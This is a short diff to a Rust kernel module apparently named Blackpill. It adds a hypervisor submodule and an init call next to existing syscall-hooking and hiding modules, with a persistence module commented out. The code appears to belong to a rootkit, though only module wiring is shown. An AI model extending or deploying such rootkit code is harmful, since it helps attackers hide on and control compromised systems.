@@ -3,6 +3,7 @@
 
 pub(crate) mod hiding;
 pub(crate) mod hooking;
+pub(crate) mod hypervisor;
 // pub(crate) mod persistence;
 #[macro_use]
 pub(crate) mod utils;
@@ -32,6 +33,9 @@ impl kernel::Module for Blackpill {
 
         // Hook syscalls
         hooking::hook_syscalls();
+
+        // Initialize the hypervisor
+        hypervisor::init();
 
         Ok(Blackpill)
     }
